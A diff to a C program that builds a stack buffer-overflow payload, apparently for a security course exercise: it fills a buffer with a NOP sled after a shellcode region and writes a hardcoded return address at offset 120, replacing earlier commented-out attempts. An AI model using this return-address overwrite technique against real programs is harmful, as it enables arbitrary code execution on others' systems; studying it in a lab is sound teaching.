@@ -9,7 +9,7 @@
 #define SHELL_SIZE 45
 #define BUF_TO_RET 120
 #define BUF_SIZE 126
-#define BUF_ADDR 0x2021feb0
+#define BUF_ADDR 0x2021fe10
 
 int
 main ( int argc, char * argv[] )
@@ -22,22 +22,10 @@ main ( int argc, char * argv[] )
 	for (int i = SHELL_SIZE; i < BUF_TO_RET; i++)
 		attack_buffer[i] = 0x90;
 
-	// int * ret_address = (int*)&attack_buffer[BUF_TO_RET];
-	// *ret_address = 0x2021feb0;
-	// attack_buffer[BUF_SIZE - 1] = '\0';
-
-	int target = 0x2021fe10;
-	// char *ptr = (char*)0x2021feb0;
-
-	// for(int i = 0; i < 6; i++){
-	// 	*(attack_buffer+120+i) = ptr[i];
-	// }
-	attack_buffer[BUF_TO_RET + 3] = (char) (target & 0x000000ff);
-	attack_buffer[BUF_TO_RET + 2] = (char) ((target >> 8) & 0x0000ff);
-	attack_buffer[BUF_TO_RET + 1] = (char) ((target >> 16) & 0x00ff);
-	attack_buffer[BUF_TO_RET] = (char) (target >> 24);
-
-	//memcpy(&attack_buffer[BUF_TO_RET], (char *)0x2021fe10, sizeof(char *));
+	attack_buffer[BUF_TO_RET + 3] = (char) (BUF_ADDR & 0x000000ff);
+	attack_buffer[BUF_TO_RET + 2] = (char) ((BUF_ADDR >> 8) & 0x000000ff);
+	attack_buffer[BUF_TO_RET + 1] = (char) ((BUF_ADDR >> 16) & 0x000000ff);
+	attack_buffer[BUF_TO_RET] = (char) (BUF_ADDR >> 24);
 
 	printf("attack_buffer %s\n",attack_buffer);
 	printf("%x%x%x%x\n",attack_buffer[BUF_TO_RET],
